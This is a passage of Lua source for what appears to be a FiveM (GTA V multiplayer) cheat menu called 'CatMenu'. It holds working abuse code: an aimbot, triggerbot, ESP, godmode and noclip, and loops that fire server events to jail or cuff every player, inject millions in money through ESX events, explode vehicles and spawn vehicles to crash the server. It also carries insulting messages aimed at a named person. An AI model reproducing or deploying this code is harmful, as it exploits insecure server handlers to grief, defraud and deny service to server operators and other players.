	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			drawNotification("Hung for 5 seconds, killing to prevent issues...")
		end
	end
end

function getEntity(player)
	local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
	return entity
end

function GetInputMode()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function DrawSpecialText(m_text, showtime)
	SetTextEntry_2("STRING")
	AddTextComponentString(m_text)
	DrawSubtitleTimed(showtime, 1)
end

-- MAIN CODE --


ShowHudComponentThisFrame(14)

Citizen.CreateThread(function() 
	local headId = {}
	while true do
		Citizen.Wait(1)
		if playerBlips then
			-- show blips
			for id = 0, 128 do
				if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
					ped = GetPlayerPed(id)
					blip = GetBlipFromEntity(ped)

					-- HEAD DISPLAY STUFF --

					-- Create head display (this is safe to be spammed)
					headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
					wantedLvl = GetPlayerWantedLevel(id)

					-- Wanted level display
					if wantedLvl then
						SetMpGamerTagVisibility(headId[id], 7, true) -- Add wanted sprite
						SetMpGamerTagWantedLevel(headId[id], wantedLvl) -- Set wanted number
					else
						SetMpGamerTagVisibility(headId[id], 7, false)
					end

					-- Speaking display
					if NetworkIsPlayerTalking(id) then
						SetMpGamerTagVisibility(headId[id], 9, true) -- Add speaking sprite
					else
						SetMpGamerTagVisibility(headId[id], 9, false) -- Remove speaking sprite
					end

					-- BLIP STUFF --

					if not DoesBlipExist(blip) then -- Add blip and create head display on player
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
					else -- update blip
						veh = GetVehiclePedIsIn(ped, false)
						blipSprite = GetBlipSprite(blip)
						if not GetEntityHealth(ped) then -- dead
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
							end
						elseif veh then
							vehClass = GetVehicleClass(veh)
							vehModel = GetEntityModel(veh)
							if vehClass == 15 then -- Helicopters
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 8 then -- Motorcycles
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 16 then -- Plane
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 14 then -- Boat
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("rhino") then -- Tank
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("pbus") then -- Prison Bus
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
							end

							-- Show number in case of passangers
							passengers = GetVehicleNumberOfPassengers(veh)

							if passengers then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							-- Remove leftover number
							HideNumberOnBlip(blip)
							if blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
							end
						end
						
						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
						SetBlipNameToPlayerName(blip, id) -- update blip name
						SetBlipScale(blip,  0.85) -- set scale

						-- set player alpha
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		else
			for id = 0, 128 do
				ped = GetPlayerPed(id)
				blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then -- Removes blip
					RemoveBlip(blip)
				end
				if IsMpGamerTagActive(headId[id]) then
					RemoveMpGamerTag(headId[id])
				end
			end
		end
	end
end)

Citizen.CreateThread(
	function()
		while Enabled do
			Citizen.Wait(0)
			SetPlayerInvincible(PlayerId(), Godmode)
			SetEntityInvincible(PlayerPedId(), Godmode)
			if SuperJump then
				SetSuperJumpThisFrame(PlayerId())
			end
			
			if ePunch then
				SetExplosiveMeleeThisFrame(PlayerId())
			end

			if InfStamina then
				RestorePlayerStamina(PlayerId(), 1.0)
			end

			if Invisible then
				SetEntityVisible(GetPlayerPed(-1), false, 0)
			else
				SetEntityVisible(GetPlayerPed(-1), true, 0)
				
			if(SpeedDemon) then
			if IsPedSittingInAnyVehicle(ped) then
			local veh = GetVehiclePedIsUsing(ped)
				if veh ~= nil then		
					SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 15000000.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.50);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 4.5);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.38);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 5.00);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.50);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 65.00);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.80);
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(ped, false), 12.0)
					SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(ped, false), 6.0);
				end
			end
		end
	end


			if VehicleGun then
				local VehicleGunVehicle = "Freight"
				local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
						if IsPedShooting(GetPlayerPed(-1)) then
							while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(VehicleGunVehicle))
							end
							local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
							SetEntityAsNoLongerNeeded(veh)
							SetVehicleForwardSpeed(veh, 150.0)
						end
					end
				end
			end

			if DeleteGun then
				local gotEntity = getEntity(PlayerId())
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
						if IsPlayerFreeAiming(PlayerId()) then
							if IsEntityAPed(gotEntity) then
								if IsPedInAnyVehicle(gotEntity, true) then
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
										DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								else
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								end
							else
								if IsControlJustReleased(1, 142) then
									SetEntityAsMissionEntity(gotEntity, 1, 1)
									DeleteEntity(gotEntity)
									drawNotification("~g~Deleted!")
								end
							end
						end
					end
				end
			end

			if destroyvehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						SetVehicleUndriveable(vehicle,true)
						SetVehicleEngineHealth(vehicle, 100)
					end
				end
			end
			
						if freezeall then
				for i = 0, 128 do
						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
						TriggerServerEvent('cuffServer', GetPlayerServerId(i))
						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent('esx_handcuffs:cuffing', GetPlayerServerId(i))
						TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
					end
				end
	  
			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end

			if esp then
				for i = 0, 300 do
					if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
						local ra = RGBRainbow(1.0)
						local pPed = GetPlayerPed(i)
						local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
						local x, y, z = table.unpack(GetEntityCoords(pPed))
						local message =
							"~g~" ..
							GetPlayerName(i) ..
										"\n~b~ Dist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, false), 1)
				
						DrawText3D(x, y, z + 1.0, message, 255, 255, 255)

						LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

						TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

						ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
					end
				end
			end

			if supergrip then
				SetHandlingInt(GetVehiclePedIsUsing(PlayerPedId()), CHandlingData, fTractionCurveMin, 1000000)
			end

			if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end

			if blowall then
                for i = 0, 300 do
						AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
			end

			if banallusers then
				for i = 0, 450 do
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TriggerServerEvent("esx_jailler:sendToJail", GetPlayerServerId(i), 59999, "Catroleplay.com rafon pamietaj kc", 997)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "youtube.com/c/Cat98 <--- NAJLEPSZE CHEATY NA FIVEMA :)", 300)
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "youtube.com/c/Cat98 <--- NAJLEPSZE CHEATY NA FIVEMA :)")
				TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "youtube.com/c/Cat98 <--- NAJLEPSZE CHEATY NA FIVEMA :)")
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TriggerServerEvent("8321hiue89js", GetPlayerServerId(i), 5007, "xCat jebac wasz antycheat ;) ONLY CatROLEPLAY.COM", 32532532, securityToken)
				TriggerServerEvent("esx_jailer:sendToJailCatfrajerze", GetPlayerServerId(i), 300000, "xCat geng, jebac fivem poteznie", 500324532)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "youtube.com/c/Cat98 <--- NAJLEPSZE CHEATY NA FIVEMA :)")
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "dude weed")
				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." xCat on YOUTUBE.")
					end
				end

			if esxdestroy then
				for i = 0, 450 do
						TriggerServerEvent('esx_truckerjob:pay', 9999999999)
						TriggerServerEvent('AdminMenu:giveCash', 9999999999)
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Uhm missclick?", 10000000)
						TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."Uhhhhh fortnite?")
				end
			end
			
			if servercrasher then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
				CreateVehicle(GetHashKey(avion), 0, 0, -10, true, true)
				CreateVehicle(GetHashKey(avion), 0, 0, -50, true, true)
				CreateVehicle(GetHashKey(avion), 0, 0, -100, true, true)
				CreateVehicle(GetHashKey(avion2), 0, 3, -1000, true, true)
				CreateVehicle(GetHashKey(avion2), 1621, 0, -50, true, true)
				CreateVehicle(GetHashKey(avion2), 1242, 1, -100, true, true)
				CreateVehicle(GetHashKey(camion), 612, 4, -10, true, true)
				CreateVehicle(GetHashKey(camion), 1234, 0, -50, true, true)
				CreateVehicle(GetHashKey(camion), 0, 0, -100, true, true)
				CreateVehicle(GetHashKey(random), 512, 1233, -10, true, true)
				CreateVehicle(GetHashKey(random), 155, 2, -50, true, true)
				CreateVehicle(GetHashKey(random), 333, 0, -100, true, true)
				CreateVehicle(GetHashKey(heli), -121, 100, -10, true, true)
				CreateVehicle(GetHashKey(heli), -121, 2555, -50, true, true)
				CreateVehicle(GetHashKey(heli), -121, 123, -100, true, true)
			end

			if nuke then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
                for i = 0, 128 do
						while not HasModelLoaded(GetHashKey(avion)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(avion))
						end
						Citizen.Wait(200)

						local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
                end
			end

			if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
				if IsControlPressed(0, 118) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
				elseif IsControlPressed(0, 109) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
				end
			end

			if TriggerBot then
				local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
				if Aiming then
					if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
						ShootPlayer(Entity)
					end
				end
			end

			if AimBot then
				for i = 0, 128 do
					if i ~= PlayerId() then
						if IsPlayerFreeAiming(PlayerId()) then
							local TargetPed = GetPlayerPed(i)
							local TargetPos = GetEntityCoords(TargetPed)
							local Exist = DoesEntityExist(TargetPed)
							local Dead = IsPlayerDead(TargetPed)

							if Exist and not Dead then
								local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
								if IsEntityVisible(TargetPed) and OnScreen then
									if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 1000) then
										local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
										SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
									end
								end
							end
						end
					end
				end
			end

			DisplayRadar(true)

			if RainbowVeh then
				local ra = RGBRainbow(1.0)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
				SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			end

			if Noclip then
				local currentSpeed = 2
				local noclipEntity =
					IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
				FreezeEntityPosition(PlayerPedId(), true)
				SetEntityInvincible(PlayerPedId(), true)

				local newPos = GetEntityCoords(entity)

				DisableControlAction(0, 32, true) --MoveUpOnly
				DisableControlAction(0, 268, true) --MoveUp

				DisableControlAction(0, 31, true) --MoveUpDown

				DisableControlAction(0, 269, true) --MoveDown
				DisableControlAction(0, 33, true) --MoveDownOnly

				DisableControlAction(0, 266, true) --MoveLeft
				DisableControlAction(0, 34, true) --MoveLeftOnly

				DisableControlAction(0, 30, true) --MoveLeftRight

				DisableControlAction(0, 267, true) --MoveRight
				DisableControlAction(0, 35, true) --MoveRightOnly

				DisableControlAction(0, 44, true) --Cover
				DisableControlAction(0, 20, true) --MultiplayerInfo

				local yoff = 0.0
				local zoff = 0.0

				if GetInputMode() == "MouseAndKeyboard" then
					if IsDisabledControlPressed(0, 32) then
						yoff = 0.5
					end
					if IsDisabledControlPressed(0, 33) then
						yoff = -0.5
					end
					if IsDisabledControlPressed(0, 34) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
					end
					if IsDisabledControlPressed(0, 35) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
					end
					if IsDisabledControlPressed(0, 44) then
						zoff = 0.21
					end
					if IsDisabledControlPressed(0, 20) then
						zoff = -0.21
					end
				end

				newPos =
					GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

				local heading = GetEntityHeading(noclipEntity)
				SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
				SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
				SetEntityHeading(noclipEntity, heading)

				SetEntityCollision(noclipEntity, false, false)
				SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

				FreezeEntityPosition(noclipEntity, false)
				SetEntityInvincible(noclipEntity, false)
				SetEntityCollision(noclipEntity, true, true)
			end
		end
	end
)

function GetPlayers()
	local players = {}

	for i = 0, 128 do
		if NetworkIsPlayerActive(i) then
			table.insert(players, i)
		end
	end

	return players
end

--[[Citizen.CreateThread(
	function()
		local blips = {}
		local currentPlayer = PlayerId()

		while true do
			Wait(100)

			local players = GetPlayers()

			for player = 0, 64 do
				if player ~= currentPlayer and NetworkIsPlayerActive(player) then
					local playerPed = GetPlayerPed(player)
					local playerName = GetPlayerName(player)

					RemoveBlip(blips[player])

					local new_blip = AddBlipForEntity(playerPed)

					ped = GetPlayerPed(id)
					blip = GetBlipFromEntity(ped)

					SetBlipSprite(new_blip, 1)

					-- Enable text on blip
					SetBlipCategory(new_blip, 2)

					-- Add player name to blip
					SetBlipNameToPlayerName(new_blip, player)
					--SetBlipNameToPlayerName( blip, id ) -- update blip name

					SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
					-- Make blip white
					--SetBlipColour(new_blip, player )

					-- Set the blip to shrink when not on the minimap
					-- Citizen.InvokeNative(0x2B6D467DAB714E8D, new_blip, true)

					-- Shrink player blips slightly
					SetBlipScale(new_blip, 1.2)

					-- Add nametags above head
					Citizen.InvokeNative(0xBFEFE3321A3F5015, playerPed, playerName, false, false, "", false)

					-- Record blip so we don't keep recreating it
					blips[player] = new_blip
				end
			end
		end
	end
)]]--
function FirePlayer(SelectedPlayer)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(SelectedPlayer) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

Citizen.CreateThread(
	function()
		FreezeEntityPosition(entity, false)
		local currentItemIndex = 1
		local selectedItemIndex = 1


		CatMenu.CreateMenu("MainMenu", "Maestro~n~~r~1.0")
		CatMenu.SetSubTitle("MainMenu", "For aliza by cat")
		CatMenu.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
		CatMenu.CreateSubMenu("Xposed", "MainMenu", "Xposed")
		CatMenu.CreateSubMenu("Destroyer", "MainMenu", "Destroyer")
		CatMenu.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		CatMenu.CreateSubMenu("ServerMenu", "MainMenu", "LUA Execution")
		CatMenu.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
		CatMenu.CreateSubMenu('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		CatMenu.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		CatMenu.CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		CatMenu.CreateSubMenu("WepMenu", "MainMenu", "Weapon Menu")
		CatMenu.CreateSubMenu("SingleWepMenu", "WepMenu", "Single Weapon Menu")
		CatMenu.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
		CatMenu.CreateSubMenu("ESXMoney", "ServerMenu", "ESX Money Options")
		CatMenu.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
		CatMenu.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		CatMenu.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		CatMenu.CreateSubMenu("RecrutarPlayers", "ServerMenu", "Recrutar Players")
		CatMenu.CreateSubMenu("RecrutarPlayersOptions", "RecrutarPlayers", "Recrutar Players options")
		CatMenu.CreateSubMenu("Credits","Credits","Credits")

		local SelectedPlayer

		while Enabled do
			if CatMenu.IsMenuOpened("MainMenu") then
			    drawNotification("~g~Aliza got fucked by Cat and Flacko")
				drawNotification("~g~Official Discord: NAH BITCH")
				drawNotification("~r~Aliza")
				   if CatMenu.MenuButton("Player ~s~Menu  ~y~»", "SelfMenu") then
				elseif CatMenu.MenuButton("Online ~s~Players  ~y~»", "OnlinePlayerMenu") then
				elseif CatMenu.MenuButton("World ~s~Menu  ~y~»", "Xposed") then
				elseif CatMenu.MenuButton("Teleporte ~s~Menu  ~y~»", "TeleportMenu") then
